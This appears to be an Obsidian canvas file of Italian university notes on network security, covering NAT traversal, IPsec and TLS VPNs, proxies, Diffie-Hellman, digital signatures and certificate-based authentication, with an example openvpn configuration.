		{"id":"55310325494d4a23","type":"text","text":"# Aprire Connessioni dietro NAT\n\n- gestione delle incoming requests. il NAPT di default blocca tutte le connessioni in ingresso (slide 14), quindi è un problema se qualcuno prova ad aprire una connessione dall'esterno verso l'interno. Abbiamo 4 soluzioni possibili:\n\t- Application Level Gateways (ALGs, na specie de proxy)\n\t- Static PAT\n\t- UPnP (nel firewall), IGD\n\t- Traversal Using Relays around NAT (TURN))\n\ninteractive connectivity establishment (ICE) via STUN, TURN\n\nhole punching: siamo entrambi dietro NAT. che si fa? ci connettiamo ad un third party server e diciamo `posso ricevere qualsiasi cosa sulla porta 6000` e aspettiamo. \n\n# Example: UDP hole punching\n\n1) Host A submits to Host S the request for communication with Host B\n2) Host S submits to Host B the public endpoint (port 4000) of Host A\n3) Host B sends a packet via its public-private endpoint (port 5000) to the public endpoint of Host A (4000).\n\t1) The NAT system of Host A rejects the packet, but a NAT session on B’s side is now established (“a hole is punched”), ready to translate any packets from A’s public endpoint (port 4000) to B’s public endpoint (port 5000) into B’s corresponding private endpoint\n4) Host B notifies Host S and awaits an incoming connection from Host A\n5) Host S submits the public endpoint of Host B (port 5000) to Host A\n6) Host A uses its public-private endpoint (port 4000) to establish a connection with Host B’s public endpoint (port 5000)\n\n\nThis technique appears to work with 82 percent UDP and 64 percent TCP NAT systems\nB. Ford. Peer-to-peer communication across network address translators,2005. USENIX Annual Technical Conference","x":-7800,"y":-1400,"width":759,"height":1089},
		{"id":"83b992b6dc46137b","type":"text","text":"# VPN\n\n# VPN 9/5 TEMPORARY\n\nssl/ipsec sono implementazioni di vpn, e ce ne sono molte altre\n\nnetwwork costruita on top on a network considerata non sicura (in qualsiasi senso: anonimity, confidenciality, ...). quasi sempre si mette encryption. DOVE la metti dà diverse proprietà. tipo, VPN su ACME serve all'authentication (access control, in base a chi sei hai diversi permessi).\n\nse vuoi confidenciality devi crittare i payload, per anonimity devi farlo con gli header (tipo TOR che critta letteralmente tutto). slide 7 : IPsec not simple\n\nencrryption si può realizzare a livello\n\n- fisico - l'unico esempio che gli è venuto è con la quantistica, i.e. se misuro non sono in grado di replicare la funzione d'onda (obv non l'ha detto così, ma intende quello)\n- DLL - a livello ethernet, proteggo da là in su (IP etc). Questa ovviamente è solo local protection, quindi non funziona per Internet. Esempio?\n- Rete - il primo layer utile su Internet. IPsec. end-to-end, source-destination. Questo richiede una chiave per ogni coppia source-dest su internet. \"good for site-to-site, meno per host-to-site\" perché? dovrei fare troppe chiavi? Così dice pare\n- Trasporto - esistono protocolli qui che proteggono anche i livelli inferiori (come?? tunnel mode??)\n- Application - non è più vpn, banalmente ogni app singola deve crittare il payload finale.\n\nTunneling: stabilisco un canale sicuro sulla rete insicura (site-to-site) tramite encapsulation. se non guardo sicurezza, prendo i dati e li metto in IP. facile. in altre parole, uso in protocollo noto (IP)  per portare su Internet un protocollo non noto. se poi critto la roba dentro ottengo un secure tunnel, i.e. una VPN.\n\nse faccio così, internet vede solo un collegamento tra due endpoint. non c'è alcuna info su chi ha mandato o deve ricevere (neanche con la porta, perché sta tutto scritto nell'header VPN). tutto questo può essere realizzato con IPsec, SSL e altra roba.\n\ninvece di mandare tutto nel canale (full tunneling) posso riservarlo ad alcuni dati (split tunneling, tipo ACME: solo il traffico diretto a 100.12.1.3 non mi ricordo va nella vpn, anche perché serve solo per l'autenticazione).\n\nquesto si realizza con le routing tables (usually in a firewall device, ma non per forza). a seconda che sia sul bordo o dentro si chiama VPN (external?) o internal. Altrimenti si può mettere in DMZ. Insieme alle cose esposte ad Internet e a cose tipo IDS. DMZ può fare da filtro, in pratica. meglio la variante dual interfaces probabilmente, ma guarda meglio le slides.","x":-6802,"y":-1400,"width":759,"height":1089},
		{"id":"2a601e0236b3ef84","type":"text","text":"# VPN con `IPsec`\n\nÈ ovvio che rispetto ad una VPN realizzata a livello di Trasporto `IPsec` consente un'elaborazione dei pacchetti molto più veloce, dal momento che c'è un `layer` in meno e che è realizzato a livello di `kernel`. Di contro, è più difficile da implementare. Si fa più o meno così:\n\n- Aggiungo una security policy con il comando `spadd`, e.g. `spadd src dst any -P out ipsec esp/trasport//require` sta dicendo che ogni volta che contatto l'`IP` `dst` da `src` (`-P out` indica gli outgoing packets) usando qualsiasi (`any`) protocollo devo per forza (`require`) proteggerlo con `IPsec` in modalità `ESP/transport`;\n\t- Chiaramente va fatto anche per `-P in` ed entrambe vanno messe anche sull'altro `host` per implementare `IPsec` in entrambe le direzioni.\n- Posso settare le chiavi per AH ed ESP manualmente con il comando `add`, e.g. `add src dst proto spi -A authalgo key` (`-E encalgo` per `ESP`).\n\t- ***Posso farlo, ma non devo farlo***. Lascia sempre fare ai protocolli automatici come ***IKEv2***.\n\nQuesto è parte del secondo assignment ACME e del laboratorio 5, ma non ho visto nessuno dei due!!","x":-12604,"y":19072,"width":759,"height":583,"color":"3"},
		{"id":"61fb8c59d64c9aff","type":"text","text":"\n\nprocede con le stesse cose versione IPv6 mi sa\n\nun DoS con IPv6 è: quando fai DAD ti dico che l'indirizzo che hai scelto non va bene. a spam. non prenderai mai un GUA e non ti collegherai mai alla rete.\n\npoi spoofing se posso creare dei messaggi rogue RA (obv). se poi faccio flooding di RA ci sono i vecchi SO che li processano tutti, quindi proprio DoS easy\n\nin modo analogo posso fare da rogue DHCP server, DNS, e abusare di redirect.\n\nsegue ex4 ed ex5 sulla falsariga di ciò. vedi rec perché mi so scocciato dopo due ore e mezza. Ma la rec è muta, yeeeeeee\n\n\nSOURCE DESTINATION FLOW ...... DATI\n\n192.168... 100.100...... -- -- -- CIAO COME STAI","x":-5031,"y":15300,"width":759,"height":480},
		{"id":"d89d0c73dd40c9a0","type":"text","text":"CBC = cipher block chaining : ogni pezzetto del pacchetto influenza come viene crittato il successivo, in sequenza","x":-13320,"y":20827,"width":303,"height":173},
		{"id":"56966ad550bf0ac1","type":"file","file":"ESP.png","x":-13600,"y":18678,"width":759,"height":159},
		{"id":"67beefd814654a9d","type":"file","file":"AH.png","x":-13600,"y":18332,"width":758,"height":238},
		{"id":"417a5234ebfd245a","type":"text","text":"# VPN con `SSL/TLS`\n\nQuando nello ***Schemino coi Colori*** arrivo ad incapsulare fino al livello Applicazione, i.e. <span style=\"color:#cd0a0a\">Ethernet( IP(</span><span style=\"color:#6969FF\"> Trasporto( Applicazione(</span><span style=\"color:#00b050\"> Ethernet( IP( Dati))</span><span style=\"color:#6969FF\">))</span><span style=\"color:#cd0a0a\">))</span>, quel pezzo blu indica che ho stabilito una connessione crittata con il `server VPN` remoto. Questa cosa si può realizzare con ***SSL*** o con il suo successore ***TLS***. Come?\n\n- Il `client VPN` è in possesso di un file di configurazione che contiene, tra le altre cose, l'`indirizzo IP` del `server VPN`. Il client inizia un ***Handshaking TLS***;\n- Il `server VPN` deve ovviamente avere un certificato valido. Sarebbe meglio farsene rilasciare uno da una ***Certificate Authority*** (***CA***), ma può capitare che sia auto-firmato (\"`SnakeOil`\", per qualche motivo);\n- Il `client` si fida in automatico se il certificato è verificabile tramite CA, altrimenti deve aggiungerlo manualmente alla lista dei certificati attendibili;\n\t- Tradotto, tutti possono fare da CA, ma i client considerano affidabili solo i certificati di CA note (e.g. Let’s Encrypt, DigiCert). Anche un firewall può creare certificati ***X.509*** e fare da CA (cfr. ***Secondo Assignment ACME***), ma i client devono fidarsi.\n- Spesso e volentieri anche il `server VPN` vuole verificare l'identità del `client`, quindi il gioco del certificato si ripete al contrario. È questo il caso quando si usa ***mutual TLS***.\n\nVisto che tutte queste danze includono un overhead notevole, spesso si preferisce appoggiare questi protocolli su `UDP` piuttosto che su `TCP` (e.g. `openvpn`, se glielo chiedi per favore può farlo anche su `TCP`, ma come detto non è la scelta migliore).\n\nDetto questo, ci sono due principali modelli per usare una simile VPN:\n\n- ***SSL Portal VPN*** - Fai login con `username` e `password` su un portale web e da lì accedi ai servizi web-based offerti. Si differenzia da un normale sito perché in questo caso il `server VPN` fa da ***reverse proxy*** consentendoti di accedere ai `server` dietro di esso;\n\t- È comunque vincolato ad utilizzare `HTTPS` o protocolli che possono essere `wrapped` all'interno di esso.\n- ***SSL Tunnel VPN*** - Quello che normalmente ti immagini quando pensi ad una VPN, il che include più flessibilità nelle possibili applicazioni.\n\nIn entrambi i casi, si può fare ***application translation*** (e.g. ponendosi da intermediario, il `server VPN` può offrire un'interfaccia web a servizi che sui server originari non ce l'hanno), o, come dicevamo prima, ***network extension*** (accesso a reti remote o private).\n","x":-11592,"y":19890,"width":759,"height":1089,"color":"4"},
		{"id":"c3315c4e442a2873","type":"text","text":"# Reverse Proxy\n\nL'obiettivo di un Reverse Proxy è quello di porsi davanti al `server` che vuole essere raggiunto dai `client`. Dall'esterno sembrerà il vero `endpoint`, ma di fatto si limiterà a smistare le richieste nel vero `backend` (spesso più copie dello stesso `server`). Segue che le sue attività naturali sono:\n\n- ***Load Balancing*** - Viene da sé;\n- ***Caching dei contenuti statici*** - Le moderne pagine `HTML` si dividono in una parte statica (e.g. l'interfaccia, visibile a tutti) e una dinamica (generata *ad hoc* per l'utente che fa login, e.g. le transazioni della carta di credito). Posso mettere in cache quello che verrà sicuramente richiesto da tutti, sgravando il `server` da un peso inutile e lasciandogli solo la parte dinamica;\n- ***Compressione*** - Quando il `client` lo richiede, tocca al `server` eseguire la compressione. Se invece lo faccio fare al Reverse Proxy riduco l'overhead computazionale del `server`;\n- ***Hardening*** - Visto che nasconde la rete interna dietro di sé e smista e \"ripulisce\" il traffico in ingresso costituisce di fatto un layer di sicurezza e protezione. Può fare da ***Web Application Firewall*** (***WAF***, i.e. un ALF specifico per `HTTP`, utile se sto proteggendo dei `server web`), interpretando il contenuto delle richieste e bloccando SQL Injection, Cross-Site Scripting e richieste malformate (e.g. tramite `ModSecurity` su Apache).\n\t- Questa cosa è particolarmente utile per le reti IoT, dove sono richieste ***autenticazione*** e ***autorizzazione***. Se poi raccolgo anche i log (***auditing***) queste proprietà sono spesso riportate insieme come ***AAA services***.\n\nDiscorso meritatamente a parte per ***TLS***. Posso sfruttare il proxy per:\n\n- ***Acceleration*** - Essendo l'asymmetric encryption molto pesante computazionalmente, posso usare il proxy come HW dedicato che si occupa solo di questo e passa i risultati al `server`;\n- ***Offloading*** - Faccio gestire direttamente tutto `TLS` al proxy. Questo significa che il proxy può fare da WAF per poi inoltrare il traffico al `server`, in due modi (si sceglie caso per caso):\n\t- ***SSL Termination*** - Il traffico tra proxy e server di `backend` è in chiaro. Utile per far funzionare al meglio servizi di IDS o, se la guardiamo al contrario, mi permette di offrire connessioni `HTTPS` ad un `server` di `backend` che nativamente non supporta `TLS`;\n\t- ***SSL Forwarding*** - Ho una seconda connessione `TLS` con il `server`, quindi i dati vengono nuovamente crittati prima di essere passati al `backend`.\n\nAvendo dietro di sé diversi domini, il Reverse Proxy incorre spesso in un problema: quando il `client` avvia una connessione `TLS` richiede il certificato del sito. Già, ma quale? La connessione `TLS` con il proxy avviene prima che il `client` lo specifichi, quindi a priori non posso sapere quale certificato mandare. Questo problema viene risolto da `TLS` stesso includendo nella `client hello` il campo ***Server Name Indication*** (***SNI***), con il quale il `client` dichiara fin da subito a quale dominio vuole connettersi, in modo da permettere al proxy di presentargli il giusto certificato. In pratica, in questo modo il proxy può offrire diversi domini sullo stesso socket `IP/Porta`. Poi visto che chi intercetta la `client hello` vede il dominio richiesto abbiamo pensato al ***Domain Fronting*** (i.e. uso come `SNI` quello di un qualche `CDN server` e solo dopo, nelle richieste `HTTP`, quello reale) o a crittare `SNI` con una chiave contenuta in una precedente richiesta `DNS` (***ESNI***).","x":-11592,"y":23862,"width":759,"height":1089,"color":"4"},
		{"id":"b8efc006cdb12e52","type":"text","text":"# SOCKS Proxy (cenni)\n\nCome `HTTP CONNECT`, ma l'handshaking viene fatto dal ***protocollo SOCKS***. Nelle versioni recenti (`SOCKS5`) supporta `IPv4/IPv6` e `TCP/UDP`, ed opera tra Trasporto e Applicazione. La cosa bella è che non gliene frega niente di quale tipo di traffico stai inserendo nel tubo che crea. A dire il vero, manco lo capisce. L'unico problema è che non lo cifra, motivo per cui tendenzialmente ci sono due modi per usarlo:\n\n- ***SSH*** - Normalmente, una connessione `SSH` permette di collegarsi ad un terminale remoto per eseguire comandi. Posso però sfruttare questo tunnel cifrato per metterci dentro qualsiasi protocollo. Come? Con `-D 1080 user@server`. Questa roba configura un proxy SOCKS locale sulla porta `1080`, il che significa che qualsiasi cosa io invio su `1080:localhost` va dritto nel tunnel `ssh` come `bytestream`. Questo significa che posso metterci dentro, e.g., `FTP:21`, e il `server` remoto interpreterà normalmente la richiesta. Dall'esterno vedo solo roba crittata;\n- ***TOR*** - Similmente, il `client TOR` apre un proxy SOCKS in locale e lo usa per indirizzare il proprio `bytestream` super-crittato verso il prossimo relay.","x":-11592,"y":21876,"width":759,"height":427,"color":"4"},
		{"id":"98ddc534ba23fd4e","type":"text","text":"# Proxy 16/05\n\n##### forward proxy\n\npenso che il punto della slide 5 sia dire che mentre normalmente se mi connetto al server scrivo la get come `get path/doc.html HTTP/1.0`, se sono connesso con il proxy devo aggiungere il nome del server nella richiesta `GET`. Credo eh, controlla. Posso anche specificare protocolli diversi nella get (e.g. ftp, slide 6)\n\nIl punto è che essendo una middlebox tra client e server puoi farci ACL, blacklist e check sulle risposte, il tutto a livelli alti (applicazione, cosa che invece un firewall non fa).\n\ncaching pensato originariamente per ovviare al problema della lentezza delle connessioni (così ti metti cose pesanti più vicine ai client). in quest'ottica ha anche senso l'esistenza del metodo HEAD. Approfondisci CONNECT slide 8. Ok lo fa alla slide dopo. quando dice unmodified intende che il proxy non è inteso per capire quello che dico (forwarda il byte stream, non si occupa di fare delle richieste per te (i.e. in questo caso dovrebbe CAPIRLE)).\n\ntutto ciò ha un problemino con TLS. Se mi connetto HTTPS lo sto facendo con il proxy, nulla mi dice che lui critti i dati verso il server. Quindi non si fa, piuttosto si usa CONNECT: uso HTTP classico fino al proxy, dopodiché negozio le chiavi di TLS direttamente col server. A quel punto il router diventa identico ad un qualsiasi router su internet, ed è per questo che i proxy spesso vietano la CONNECT. Magari questo proxy viene usato per diffindere malware e lui non lo sa.\n\n- variante SSL Forward Proxy - l'idea è decrittare il traffico del client e poi crittarlo di nuovo (e.g. tramite burp suite proxy SSL). Usato da banche, militari, compagnie grosse ecc. Anche se uso HTTPS il proxy ispeziona quello che faccio. a na certa inizia a chiamarlo firewall, boh\n\t- in pratica il firewall ti invia un certificato che dice `SONO GOOGLE!!`, ma è rilasciato ad esempio da una certa `Burp Certificate Authority`. Questo si vede analizzando il pacchetto (forse lo vede anche il browser?)\n\t- anche detto SSL strip (?), puoi farci MitM.\n###### anonymizer proxy\n\nvoglio cambiare il source ip delle mie richieste. mi fido del proxy e gli do i miei dati sostanzialmente. questi servizi sono offerti da hidemyass, nordvpn, ... paghi e ti fidi.\n\n\n###### reverse proxy\n\nfa da proxy al server, molto comune oggi (tipo 90% delle connessioni oggi. non è mai il server a gestire le richieste, ma una pletora di suoi proxy, che dovrebbero essere le repliche cfr. distributed systems).\n\nTLS acceleration ha senso se i proxy sono vicini al server (i.e. implemento TLS che è pesante solo sul proxy, poi la connessione proxy-server è in chiaro quindi leggera). di buono c'è che se il server di suo non implementa TLS con il proxy posso fornire HTTPS (fantastic coffe su ACME sua HTTP ma possiamo renderlo HTTPS)\n\n- questa roba se capisco bene si chiama SSL Termination (slide 20, perché l'ordine è tutto mischiato???)\n- altrimenti SSL forwarding?\n\nslide 17 dice roba figa per IoT. il gateway fa da reverse proxy??\n\n<span style=\"color:rgb(236, 155, 14)\">segui a lungo la lezione prima di scrivere qualsiasi cosa, l'ordine in cui affronta le cose è strano e potrebbe rispondere a dubbi o dare altri pezzi del puzzle in momenti inattesi</span>\n\na circa 30 minuti dalla fine fa roba che dice essere tricky\n\n","x":-5682,"y":-1589,"width":796,"height":1398},
		{"id":"84a3a841f5ca1182","type":"text","text":"# OPIS: YHES2SB9","x":-12424,"y":21037,"width":400,"height":391,"color":"1"},
		{"id":"85eca954158e2356","type":"file","file":"X.509_Certificate.png","x":-11592,"y":21268,"width":759,"height":320},
		{"id":"2f5c76d0ee85d71d","type":"text","text":"# Implementazioni VPN\n\nVedi Laboratorio 5","x":-12604,"y":20317,"width":759,"height":235,"color":"4"},
		{"id":"73a64c87231fc348","type":"text","text":"# SPACING","x":-15119,"y":17776,"width":250,"height":235,"color":"5"},
		{"id":"302f4ad768a333c2","type":"text","text":"Psec Security Associations\n●\nThink of it as an IPsec connection: all of the parameters needed, like crypto algorithms\n(AES, SHA1, etc.), modes of operation (CBC, HMAC, etc.), key lengths, traffic to be\nprotected, etc.\n●Both sides must agree on the SA for secure communications to work\n●For a two-way communication, two SAs must be defined.\n●\n●\n66\nSA parameters must be negotiated (using IKE) between sender and receiver before\nsecure communication can start.\nEach SA is identified by:\n–Security Parameters Index (SPI): 32-bit integer chosen by sender. Enables receiving system to\nselect the required SA.\n–Destination Address: Only unicast IP addresses allowed!\n–Security Protocol Identifier: AH or ESP.","x":-20094,"y":12673,"width":940,"height":1020},
		{"id":"21eda579e812d04d","type":"file","file":"0 - Reti di Elaboratori/AutenticazioneCompleta.png","x":-25335,"y":17351,"width":566,"height":304},
		{"id":"8daae2e223e61b92","type":"text","text":"# Integrità dei Certificati di Autenticazione\n\nLe persone fisiche si recano all'***Autorità di Certificazione*** (***CA***) registrando la propria chiave pubblica e fornendo una prova d'identità diretta.\n\nQuesta crea un documento (***certificato***) contenente i dati di A, la sua $K^+_A$ e la ***firma digitale della CA*** su quel documento (anche la CA ha una propria coppia $K^-_{CA}, K^+_{CA}$, e quest'ultima viene pubblicata e verificata da tutti).\n\nIn questo modo dopo che B manda il nonce $R$ ad A e dopo che questa risponde con $K^-_A(R)$ e con il proprio certificato per $K^+_A$, B può verificare la firma digitale della CA applicando $K_{CA}^+$.\n\nA questo punto ci sono solo due possibili casi di fallimento:\n\n- La CA è compromessa (amen, B non sarà l'unico a piangere);\n- Qualcuno riesce a fare ***contemporaneamente*** un ***man in the middle*** tra A e B (con cui fornisce a B un certificato falso) e un altro tra B e la CA (con cui fornisce a B una $K_{CA}^+$ falsa). Intuitivamente, è ***realizzabile solo da enti governativi o di potenza computazionale e politica paragonabile***.","x":-24519,"y":17193,"width":681,"height":620,"color":"#4545ff"},
		{"id":"81ebf79a3f35ef78","type":"text","text":"# Integrità\n\nSe B critta un messaggio con la propria ***chiave privata*** (meglio ancora se certificata da una CA) garantisce a tutti che l'autore sia proprio lui.\nAssicura anche che nessun altro può aver modificato il messaggio (che quindi è integro). Anche legalmente, B non può negare di aver scritto il messaggio (garantisce il ***non-ripudio***).\n\nTutto questo è molto bello, ma crittare interi messaggi con RSA è\ncomputazionalmente troppo costoso. Allora mi invento una funzione $H$ (detta di ***hash***) in grado di fare un riassunto del messaggio (***digest***).\n\nB calcola il digest sul messaggio originale, dopodiché lo critta con la chiave privata. Chi riceve il documento decritta il digest con la chiave pubblica e lo confronta con quello calcolato da B.\n\nIl digest crittato con la chiave privata è detto ***firma digitale***. $H$ deve essere tale che sia quasi impossibile modificare il messaggio senza di riflesso modificare il digest (i.e. dato un digest $x$ è molto costoso a livello computazionale trovare un messaggio $m$ tale che $H(m) = x$) di , nonostante sia previsto che più messaggi vengano riassunti nello stesso digest.\n\nFunzioni di hash tipicamente utilizzate sono ***MD5*** (RFC 1321) e ***SHA-1***.","x":-23560,"y":17193,"width":597,"height":620,"color":"#4545ff"},
		{"id":"b0e3b53a1216f082","type":"file","file":"0 - Reti di Elaboratori/FirmaDigitale.png","x":-23461,"y":16893,"width":400,"height":182},
		{"id":"07e873cb35322fa0","type":"text","text":"# Diffie-Hellman\n\nCome faccio a concordare una chiave segreta in un luogo pieno di spie come Internet?\n\n***Diffie-Hellman*** è un protocollo che mi permette di fare questo con qualcuno di cui non so nulla e che non sa nulla di me, sfruttando l'estrema ***difficoltà computazionale*** per invertire operazioni di ***moltiplicazione modulare*** e ***logaritmi discreti*** usando ***numeri primi***.\n\n- Alice e Bob si scambiano anzitutto due numeri in chiaro:\n\t- $p$ - Definisce che tutte le operazioni verranno svolte in $\\Z_p$;\n\t- $g$ - Verrà usato come base per tutte le operazioni che seguiranno.\n- Scelgono poi due numeri casuali, rispettivamente, $x$ ed $y$ (entrambi $<p$, in quanto $\\in \\Z_p$);\n- Alice manda pubblicamente a Bob $X=g^x\\text{ mod }p$, Bob fa lo stesso con $Y=g^y\\text{ mod }p$. Pur essendo un'informazione pubblica, invertire questa operazione per risalire ad $x$ ed $y$ è difficilissimo: possiamo assumere che solo Alice conosca $x$ e che solo Bob conosca $y$;\n- Alice crea la chiave come $K=Y^x\\text{ mod }p$, Bob stessa cosa con esponenti al contrario;\n- Per le proprietà dell'algebra modulare, Alice e Bob condividono ora la stessa chiave:$$K=g^{xy}\\text{ mod }p$$\n\nL'unico modo di ricostruire la chiave dall'esterno in tempi computazionalmente fattibili è di conoscere almeno uno dei due numeri casuali (l'informazione dell'altro viene da $g^x$ o $g^y$).","x":-20155,"y":17748,"width":759,"height":583,"color":"4"},
		{"id":"ab1584a0345d28b5","type":"text","text":"# SSL/TLS\n\nProtocolli di sicurezza tra il layer di Trasporto e Applicazione, si occupano sia di crittare i dati che di verificare i ***certificati di autenticità***, i.e. firme digitali in grado di attestare che il server con cui si è stabilita la connessione è effettivamente chi dice di essere (previene attacchi di tipo **man-in-the-middle**). Seguono concettualmente uno schema del tipo\n\n- ***Handshaking*** - quando si crea la connessione con il server che supporta SSL/TLS:\n\t- Vengono scambiate le chiavi pubbliche $K^+$ di uno schema di cifratura asimmetrica (e.g. ***Diffie-Hellman***). Il server fornisce il suo certificato di autenticità al client, il quale lo inoltra al server di un'***Autorità di Certificazione*** (***CA***) in grado di validare il certificato tramite il proprio DB (e viceversa, se necessario);\n\t- Accertata l'autenticità dell'interlocutore, il client invia al server un ***Master Secret*** (***MS***) crittato con $K^+_S$, il quale applica $K^-_S$ e usa il MS per generare tutte le ***chiavi simmetriche per la sessione***;\n\t\t- Perché non una sola? Per minimizzare i dati a disposizione degli attaccanti si usano chiavi distinte per la comunicazione client $\\to$ server ($K_{CS}$) e server $\\to$ client ($K_{SC}$). Seguendo questa separazione, esistono altre due chiavi per generare i codici MAC  client $\\to$ server ($M_{CS}$) e server $\\to$ client ($M_{SC}$);\n- ***Message Authentication Code (MAC)*** - ad ogni messaggio inviato viene allegato un codice generato da una ***funzione di hash*** che prende in input una delle chiavi simmetriche segrete $M_{CS}$ ed $M_{SC}$ (a seconda del verso della comunicazione), consentendo di autenticare ogni pacchetto;\n\t- TCP tratta i dati come flusso piuttosto che come messaggi, ma è sufficiente spezzettare il *bytestream* in record;\n\t- Onde evitare attacchi replay, tra gli input per generare il MAC vi è anche un **nonce** (generato da MS durante l'handshaking);\n\t- Previene anche la chiusura prematura della connessione (l'header TCP è in chiaro). Nel payload di ogni messaggio `FIN` si include allora un bit per confermarne la validità, che chiaramente contribuisce alla creazione del MAC.\n\nNel protocollo ci sono poi ulteriori misure di sicurezza e ottimizzazione, tipo:\n\n- Se cade la connessione e poi riprende non posso sapere se qualcuno si è messo a fare MitM, quindi se dovevo scambiare dati importanti (e.g. sessione bancaria) lascio cadere la connessione e la ricreo con un nuovo handshaking;\n- Posso tenere viva la connessione usando un ***heartbeat***;\n\t- La `request` richiedeva una `response` che mandasse lo stesso contenuto, della stessa lunghezza. Era possibile mandare pochissimi dati ma settare la lunghezza del pacchetto a `MAX`. Questo faceva rispondere il destinatario con `MAX byte` dalla locazione di memoria in cui aveva salvato la `request`, inviando di fatto un `buffer overflow` contenente potenzialmente informazioni sensibili (***heartbleed***).","x":-20155,"y":18566,"width":759,"height":1089,"color":"6"},
		{"id":"9c62b0a73dc2b9e0","type":"file","file":"Area Lab5 - VPN/Check_TLS_Signature.png","x":-20133,"y":19890,"width":715,"height":427},
		{"id":"fe30eb8b5eedbe3c","type":"file","file":"Area Lab5 - VPN/TLS_Handshake.png","x":-19146,"y":18566,"width":343,"height":427},
		{"id":"7668619d1289b2b7","type":"text","text":"# Esempi di file di configurazione `openvpn` (`.conf`)\n\n#### Lato Server\n\n```bash\nport 1194                 # Porta in ascolto (default OpenVPN)\nproto udp                 # Trasporto: UDP (evita TCP-over-TCP meltdown)\ndev tun                   # Interfaccia virtuale di livello 3 (IP)\n\nca   ca.crt               # Certificato CA (pubblico)\ncert server.crt           # Certificato del server\nkey  server.key           # Chiave privata del server (tenere segreta!)\n\n# Se usi DH classico:\n# dh   dh.pem      # Parametri Diffie–Hellman (non necessari con ECDHE moderno)\n\n# Pool IP assegnato ai client e netmask\nserver 10.8.0.0 255.255.255.0\n\nifconfig-pool-persist ipp.txt  # Mantiene l’associazione client->IP nel tempo\n\nkeepalive 10 120         # Ping/Pong: invia ogni 10s, considera down dopo 120s\npersist-key              # Non rilegge la key a restart del processo\npersist-tun              # Lascia su l’interfaccia tun nei riavvii soft\nuser nobody              # Droppa privilegi utente\ngroup nogroup            # Droppa privilegi gruppo\n\n# Cifratura/Autenticazione (armonizza col client)\ncipher AES-256-GCM       # Cifrario (AEAD, moderno)\nauth SHA256              # HMAC per il control channel (se richiesto)\n\n# Protezione handshake/tabelle (opzionale ma consigliata)\n# tls-crypt ta.key   # Cripta/autentica anche il canale TLS control (anti-scan)\n# tls-auth  ta.key 0 # Variante più vecchia, server side \"0\", client \"1\"\n\n# TLS più moderno:\n# tls-version-min 1.2\n# ecdh-curve secp384r1\n\n# Verifica CRL (se usi revoca)\n# crl-verify crl.pem\n\nstatus openvpn-status.log # File di stato\nverb 3                    # Verbosità log (0-11)\n```\n\n#### Lato Client\n\n```bash\nclient                    # Modalità client\ndev tun                   # Interfaccia TUN (IP)\nproto udp                 # Deve corrispondere al server\n\nremote vpnserver.local 1194  # FQDN/IP e porta del server\n# remote 203.0.113.10 1194   # Alternativa con IP\n\nca   ca.crt               # Certificato CA (per validare il server)\ncert client.crt           # Certificato del client (mutual TLS)\nkey  client.key           # Chiave privata del client\n\ncipher AES-256-GCM        # Allinea al server\nauth SHA256\n\n# Rafforza verifica dell’identità del server:\nremote-cert-tls server    # Controlla EKU/uso come \"server\"\n# verify-x509-name vpnserver.local name  # Verifica CN/SAN atteso (forte)\n\nresolv-retry infinite     # Ritenta risoluzione DNS all’infinito\nnobind                    # Non fissa una porta locale\npersist-key\npersist-tun\n\nverb 3\n```","x":-19146,"y":19364,"width":759,"height":953,"color":"4"},
		{"id":"e5832d24092e64e0","type":"text","text":"# Protezione Messaggi di Posta Elettronica\n\nEsiste un SW che implementa tutto questo a livello Applicazione, detto ***Pretty Good Privacy*** (***PGP***). È possibile inviare un messaggio allegando la propria firma PGP, così come è possibile crittare l'intero contenuto della mail.","x":-25410,"y":18410,"width":716,"height":151,"color":"#4545ff"},
		{"id":"56db37a721fcea2d","type":"text","text":"# Autenticazione Zero-Knowledge\n\n[Riassumibile](https://it.wikipedia.org/wiki/Dimostrazione_a_conoscenza_zero) con la frase \"dimostrami che sai il segreto, ma non dirmi il segreto\".\n\nSi traduce in una ***sfida statistica*** che consta di $N$ prove. La probabilità di superarle tutte scala come $\\exp^{-N}$, per cui è verosimile farlo solo se conosco il segreto.\n\nÈ impossibile tuttavia ricavare informazioni sulla natura del segreto, poiché l'unica informazione è il buon esito della prova.\n\nCon questo metodo si possono implementare cose come login senza password, verifiche sulle criptovalute e [Federated Learning](https://en.wikipedia.org/wiki/Federated_learning).","x":-25410,"y":18685,"width":716,"height":319,"color":"#4545ff"},
		{"id":"bcfe259db9d765f3","type":"text","text":"\nPuò capitare di trovare una chiave pubblica in coda alle mail.\n\n\n","x":-25310,"y":18309,"width":516,"height":58},
		{"id":"0c234fd30ac2be75","type":"text","text":"# Autenticazione\n\nCome fa B ad essere certo di star parlando davvero con A?\n\n- T può tranquillamente dichiararsi A;\n- Può anche fare ***spoofing*** e aggiungere come prova l'IP di A;\n\t- Assumiamo che il *vero* A sia quello con un certo IP$_A$;\n- B può allora richiedere ad A di mandare una password segreta concordata in precedenza, ma T può intercettare il messaggio di A (che include la password) per replicarlo a B **in un secondo momento**, quando A è offline (attacco di ***playback*** o ***replay***);\n\t- Che la password sia crittografata o meno non cambia niente;\n\t- Si noti che **questo attacco non impedisce che il messaggio di A arrivi a B**. Semplicemente, T ne fa una copia. Da cui la domanda: ma posso fare replay se A è ancora online?\n\t\t- Se ci si appoggia su TCP è difficile, B si ritroverebbe con due connessioni aperte da parte di A;\n\t\t- Se si usa UDP è più semplice, essendo stateless;\n- Per evitare il *playback attack* si usa un ***nonce*** (**n**umber used **once**).\n\t1. A invia a B un'autodichiarazione che include il suo IP;\n\t2. B sa benissimo che potrebbe essere T, quindi chiede ad A una **sfida** (**challenge**) **d'identità** e invia il nonce;\n\t3. A utilizza la chiave simmetrica condivisa per crittare il nonce e invia il risultato a B;\n\t4. B decritta con la chiave condivisa ed è certo di parlare con A.\n\nSe A e B non hanno già concordato una chiave simmetrica, il nonce può essere crittato con la chiave privata di A. B a questo punto chiede ad A la sua chiave pubblica e decritta con quella.\n\nMa c'è un problema. Non posso chiedere alla stessa persona a cui faccio il test di identità la sua chiave pubblica (è tipo un'autocertificazione, \"`sono Alice sisi`\"). Per impedire un ***man in the middle*** (in cui T si mette in mezzo impersonando B nella comunicazione con A e A nella comunicazione con B) devo essere certo che quella chiave pubblica sia ufficialmente di A.\n\nProprio per questo esistono le ***public key Certification Authorities*** (***CA***), che rilasciano dei certificati con la propria ***firma digitale*** che associano la persona fisica alla chiave pubblica.","x":-24575,"y":18191,"width":792,"height":875,"color":"#4545ff"},
		{"id":"64cf32806ffdf03e","type":"text","text":"public key infrastructure\nX.509","x":-23685,"y":19276,"width":250,"height":60},
